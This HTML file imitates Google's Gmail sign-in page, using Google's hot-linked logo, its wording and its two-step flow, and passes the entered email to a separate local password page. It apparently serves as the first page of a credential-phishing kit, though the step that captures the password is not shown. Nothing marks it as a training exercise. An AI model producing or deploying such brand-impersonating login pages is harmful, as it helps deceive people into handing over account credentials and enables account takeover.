<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
		<title>Gmail Login</title>
		<link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
		<script>
			function redirectToPasswordPage() {
				var email = document.getElementById("email").value;
				window.location.href = "password.html?email=" + encodeURIComponent(email);
			}
		</script>
		<style>
			/* Loader styles */
			.loader {
				border: 4px solid #f3f3f3;
				border-top: 4px solid #1a73e8;
				border-radius: 50%;
				width: 40px;
				height: 40px;
				animation: spin 2s linear infinite;
				position: absolute;
				top: 50%;
				left: 50%;
				transform: translate(-50%, -50%);
			}

			@keyframes spin {
				0% {
					transform: rotate(0deg);
				}
				100% {
					transform: rotate(360deg);
				}
			}

			/* Hide loader once the page is fully loaded */
			body.loaded .loader {
				display: none;
			}

			/* Show container once the page is fully loaded */
			body.loaded .container {
				display: block;
			}
		</style>
	</head>
	<body class="bg-gray-50 flex items-center justify-center h-screen">
		<div class="loader"></div>
		<div class="bg-white p-8 rounded-md shadow-md w-full max-w-md">
			<div class="text-center mb-6">
				<img
					src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png"
					alt="Google Logo"
					class="mx-auto mb-4"
				/>
				<h2 class="text-2xl font-semibold text-gray-800">Sign in</h2>
				<p class="text-gray-600">to continue to Gmail</p>
			</div>
			<form onsubmit="event.preventDefault(); redirectToPasswordPage();">
				<div class="mb-4">
					<label for="email" class="block text-gray-700">Email or phone</label>
					<input
						type="email"
						id="email"
						class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
						required
					/>
				</div>
				<div class="flex justify-end mb-6">
					<a href="/forgot.html" class="text-blue-500 text-sm">Forgot email?</a>
				</div>
				<button
					type="submit"
					class="w-full bg-blue-500 hover:bg-blue-600 text-white font-semibold py-2 px-4 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2"
				>
					Next
				</button>
				<div class="flex justify-between items-center mt-6 text-sm text-gray-600">
					<p>
						Not your computer? Use <a href="/guest.html" class="text-blue-500">Guest mode</a> to sign in
						privately.
					</p>
				</div>
			</form>
			<div class="text-center mt-8">
				<a href="/create.html" class="text-blue-500 text-sm">Create account</a>
			</div>
		</div>
		<script>
			window.addEventListener("load", function () {
				document.body.classList.add("loaded");
			});
		</script>
	</body>
</html>
